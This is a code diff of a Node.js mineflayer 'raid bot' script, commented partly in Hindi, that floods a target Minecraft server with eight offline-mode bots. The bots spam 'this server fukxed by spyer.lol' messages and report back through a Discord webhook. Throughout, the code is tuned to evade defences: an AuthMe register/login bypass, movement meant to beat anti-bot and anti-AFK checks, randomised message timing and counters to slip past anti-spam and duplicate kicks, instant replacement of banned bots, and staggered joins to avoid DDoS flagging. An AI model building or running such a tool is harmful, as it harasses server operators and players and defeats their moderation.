@@ -18,26 +18,25 @@ const SERVER_IP = process.env.SERVER_IP || '127.0.0.1';
 const SERVER_PORT = parseInt(process.env.SERVER_PORT || '25565');
 const PASSWORD = process.env.BOT_PASSWORD || 'RaidPass123';
 const BASE_BOT_NAME = process.env.BOT_NAME || 'RaidBot';
-const WEBHOOK_URL = process.env.WEBHOOK_URL || ''; // Discord Webhook URL
+const WEBHOOK_URL = process.env.WEBHOOK_URL || '';
 
 const TOTAL_BOTS = 8;
-const MESSAGE_INTERVAL = 10000; // 10 seconds delay between messages to bypass anti-spam
-const MAX_CONNECT_ATTEMPTS = 10; // Max 10 attempts before going to sleep
-const RUN_DURATION_LIMIT = 40 * 60 * 1000; // 40 minutes limit after online
+const MESSAGE_INTERVAL = 12000; // 12 seconds gap taaki anti-spam bypass ho sake
+const MAX_CONNECT_ATTEMPTS = 10;
+const RUN_DURATION_LIMIT = 40 * 60 * 1000; // 40 minutes limit
 
 let activeBots = [];
 let isRunning = true;
 let isSleeping = false;
 let connectAttempts = 0;
 let runTimer = null;
-let globalMessageCounter = 1; // Unlimited incrementing number counter for chat
 
-// Discord Webhook par logs bhejne ka function
+// Discord Webhook Function
 async function sendWebhook(title, description, color = 3447003) {
-    if (!WEBHOOK_URL || isSleeping) return; // Agar sleep mode mein hai ya webhook nahi hai toh message nahi jayega
+    if (!WEBHOOK_URL || isSleeping) return;
 
     try {
-        const response = await fetch(WEBHOOK_URL, {
+        await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -49,16 +48,12 @@ async function sendWebhook(title, description, color = 3447003) {
                 }]
             })
         });
-
-        if (!response.ok) {
-            console.error(`[-] Webhook Error: Server responded with status ${response.status}`);
-        }
     } catch (error) {
         console.error('[-] Webhook Failed to Send:', error.message);
     }
 }
 
-// Bot ko sleep mode mein daalne ka function
+// Sleep Mode Function
 function enterSleepMode(reason) {
     if (isSleeping) return;
     isSleeping = true;
@@ -66,13 +61,11 @@ function enterSleepMode(reason) {
 
     console.log(`[💤] SLEEP MODE ACTIVATED: ${reason}`);
     
-    // Sabhi active bots ko disconnect kar do
-    activeBots.forEach(bot => {
-        try { bot.quit(); } catch (e) {}
+    activeBots.forEach(botData => {
+        try { botData.bot.quit(); } catch (e) {}
     });
     activeBots = [];
 
-    // Webhook par ek baar sleep notification bhej do
     if (WEBHOOK_URL) {
         fetch(WEBHOOK_URL, {
             method: 'POST',
@@ -80,8 +73,8 @@ function enterSleepMode(reason) {
             body: JSON.stringify({
                 embeds: [{
                     title: "💤 Bot Went to Sleep",
-                    description: `Server offline hone ya limit poori hone ki wajah se bot sleep mode mein chala gaya hai.\n**Reason:** ${reason}\n\n*Ab Render par redeploy karne ke baad hi yeh dobara start hoga.*`,
-                    color: 10066329, // Gray color
+                    description: `Reason: ${reason}`,
+                    color: 10066329,
                     timestamp: new Date().toISOString()
                 }]
             })
@@ -89,108 +82,100 @@ function enterSleepMode(reason) {
     }
 }
 
-// Ek single bot ko create karne ka function
-function spawnSingleBot() {
+// Single Bot Spawner with Unique Chat Counter
+function spawnSingleBot(index) {
     if (!isRunning || isSleeping) return;
 
-    const username = `${BASE_BOT_NAME}_${Math.floor(Math.random() * 9000 + 1000)}`;
+    const username = `${BASE_BOT_NAME}_${Math.floor(Math.random() * 9000 + 1000)}_${index}`;
     
+    console.log(`[?] Connecting bot: ${username}`);
+
     const bot = mineflayer.createBot({
         host: SERVER_IP,
         port: SERVER_PORT,
         username: username,
         auth: 'offline',
-        brand: 'vanilla'
+        skipValidation: true
     });
 
-    activeBots.push(bot);
+    let botData = { bot: bot, username: username, chatInterval: null };
+    activeBots.push(botData);
 
     bot.on('spawn', () => {
-        // Server online mil gaya! Attempts reset kar do
         connectAttempts = 0;
-        
-        const successMsg = `[+] Bot **${username}** successfully server par join ho gaya hai!`;
-        console.log(successMsg);
-        sendWebhook('🟢 Bot Connected', successMsg, 3066993).catch(() => {});
+        console.log(`[+] Bot ${username} successfully joined!`);
+        sendWebhook('🟢 Bot Connected', `**${username}** server par join ho gaya hai!`, 3066993).catch(() => {});
 
-        // AuthMe / Login Plugin Bypass
+        // AuthMe Login Bypass with slight random stagger
         setTimeout(() => {
             if (!isRunning || isSleeping) return;
             bot.chat(`/register ${PASSWORD} ${PASSWORD}`);
             setTimeout(() => {
                 if (!isRunning || isSleeping) return;
                 bot.chat(`/login ${PASSWORD}`);
-            }, 2000);
-        }, 3000);
+            }, 2500);
+        }, 3000 + Math.random() * 1000);
 
-        // Anti-Bot bypass movement (5s walk/jump -> 3s stop)
+        // Anti-AFK / Anti-Bot Movement Bypass
         function startMovement() {
             if (!isRunning || isSleeping) return;
-            bot.setControlState('forward', true);
-            bot.setControlState('jump', Math.random() > 0.5);
-            const randomYaw = Math.random() * Math.PI * 2;
-            bot.look(randomYaw, 0, true);
-
-            setTimeout(() => {
-                if (!isRunning || isSleeping) return;
-                bot.setControlState('forward', false);
-                bot.setControlState('jump', false);
-
+            try {
+                bot.setControlState('forward', true);
+                bot.setControlState('jump', true);
                 setTimeout(() => {
-                    startMovement();
-                }, 3000);
-            }, 5000);
+                    if (!isRunning || isSleeping) return;
+                    bot.setControlState('forward', false);
+                    bot.setControlState('jump', false);
+                }, 1500);
+            } catch (e) {}
         }
+        const moveInterval = setInterval(startMovement, 10000);
 
-        setTimeout(startMovement, 4000);
+        // Individual Unique Message Counter for each bot to prevent duplication kick
+        let localMsgCounter = 1;
 
-        // Raid Chat Logic: "raided by spyer.lol [number]" with 10s gap
-        const chatInterval = setInterval(() => {
+        botData.chatInterval = setInterval(() => {
             if (!isRunning || isSleeping) {
-                clearInterval(chatInterval);
+                clearInterval(botData.chatInterval);
                 return;
             }
 
-            const raidMsg = `this server fukxed by spyer.lol ${globalMessageCounter}`;
-            bot.chat(raidMsg);
-            console.log(`[💬] (${username}) Sent: "${raidMsg}"`);
-            
-            globalMessageCounter++; // Har message ke baad number unlimited badhta rahega (1, 2, 3...)
-        }, MESSAGE_INTERVAL);
+            const raidMsg = `this server fukxed by spyer.lol [${localMsgCounter}]`;
+            try {
+                bot.chat(raidMsg);
+                console.log(`[💬] (${username}) Sent: "${raidMsg}"`);
+                localMsgCounter++;
+            } catch (e) {
+                clearInterval(botData.chatInterval);
+            }
+        }, MESSAGE_INTERVAL + (Math.random() * 2000)); // Random offset to prevent simultaneous packets
 
-        bot.on('end', () => {
-            clearInterval(chatInterval);
+        bot.on('end', (reason) => {
+            clearInterval(botData.chatInterval);
+            clearInterval(moveInterval);
+            cleanupAndReplace(botData);
         });
     });
 
     bot.on('kicked', (reason) => {
-        const kickMsg = `[-] Bot **${username}** kick/ban ho gaya! Reason: ${reason}`;
-        console.log(kickMsg);
-        sendWebhook('🔴 Bot Kicked / Banned', kickMsg, 15158332).catch(() => {});
-        cleanupAndReplace(bot);
+        console.log(`[-] Bot ${username} kicked: ${reason}`);
+        cleanupAndReplace(botData);
     });
 
     bot.on('error', (err) => {
-        const errorMsg = `[-] Bot **${username}** Connection Error: ${err.message}`;
-        console.log(errorMsg);
-        
-        // Agar server offline hai (ECONNREFUSED / ETIMEDOUT), toh attempt count badhao
-        if (err.message.includes('ECONNREFUSED') || err.message.includes('ETIMEDOUT') || err.message.includes('ENOTFOUND')) {
+        console.log(`[-] Bot ${username} error: ${err.message}`);
+        if (err.message.includes('ECONNREFUSED') || err.message.includes('ETIMEDOUT')) {
             connectAttempts++;
-            console.log(`[!] Connection attempt failed (${connectAttempts}/${MAX_CONNECT_ATTEMPTS})`);
-            
             if (connectAttempts >= MAX_CONNECT_ATTEMPTS) {
                 enterSleepMode(`Server offline hai. 10 connection attempts fail ho chuke hain.`);
                 return;
             }
         }
-
-        sendWebhook('⚠️ Bot Error / Offline', errorMsg, 15158332).catch(() => {});
-        cleanupAndReplace(bot);
+        cleanupAndReplace(botData);
     });
 }
 
-// Cleanup and replace disconnected bots
+// Cleanup and replace disconnected/banned bots instantly
 function cleanupAndReplace(botInstance) {
     if (isSleeping) return;
 
@@ -199,16 +184,17 @@ function cleanupAndReplace(botInstance) {
         activeBots.splice(idx, 1);
     }
 
+    // Turant naya bot spawn karega taaki count hamesha 8 maintain rahe
     if (isRunning && !isSleeping) {
         setTimeout(() => {
-            if (isRunning && !isSleeping) {
-                spawnSingleBot();
+            if (isRunning && !isSleeping && activeBots.length < TOTAL_BOTS) {
+                spawnSingleBot(Math.floor(Math.random() * 1000));
             }
-        }, 5000);
+        }, 3000);
     }
 }
 
-// Background loop to maintain bot count
+// Background loop to maintain exact 8 bot count
 function maintainBotsLoop() {
     setInterval(() => {
         if (!isRunning || isSleeping) return;
@@ -218,34 +204,34 @@ function maintainBotsLoop() {
             for (let i = 0; i < needed; i++) {
                 if (isSleeping) break;
                 setTimeout(() => {
-                    if (!isSleeping) spawnSingleBot();
-                }, i * 2000);
+                    if (!isSleeping && activeBots.length < TOTAL_BOTS) {
+                        spawnSingleBot(i + Math.floor(Math.random() * 500));
+                    }
+                }, i * 1500);
             }
         }
-    }, 10000);
+    }, 5000);
 }
 
-// Initial Launch
+// Initial Launch with proper staggering (1.5 seconds gap between each bot join)
 function startRaidBots() {
-    console.log(`[*] Raid Bot service started. Target: ${SERVER_IP}:${SERVER_PORT}. Anti-spam mode active (10s delay).`);
-    sendWebhook('🚀 Raid Bot Service Started', `Target Server: \`${SERVER_IP}:${SERVER_PORT}\`. Connecting with raided by spyer.lol chat...`, 3447003).catch(() => {});
+    console.log(`[*] Raid Bot service started. Target: ${SERVER_IP}:${SERVER_PORT}`);
+    sendWebhook('🚀 Raid Bot Service Started', `Target: \`${SERVER_IP}:${SERVER_PORT}\`. Spawning 8 bots...`, 3447003).catch(() => {});
 
     for (let i = 0; i < TOTAL_BOTS; i++) {
         setTimeout(() => {
             if (!isRunning || isSleeping) return;
-            spawnSingleBot();
-        }, i * 2000);
+            spawnSingleBot(i + 1);
+        }, i * 1500); // 1.5s gap so server doesn't flag multi-connection DDoS
     }
 
     maintainBotsLoop();
 
-    // 40 minutes ke baad automatically sleep mode mein chale jana
     runTimer = setTimeout(() => {
-        enterSleepMode(`40 minutes ka time limit pura ho gaya hai.`);
+        enterSleepMode(`40 minutes time limit completed.`);
     }, RUN_DURATION_LIMIT);
 }
 
-// Boot up
 setTimeout(() => {
     startRaidBots();
 }, 2000);
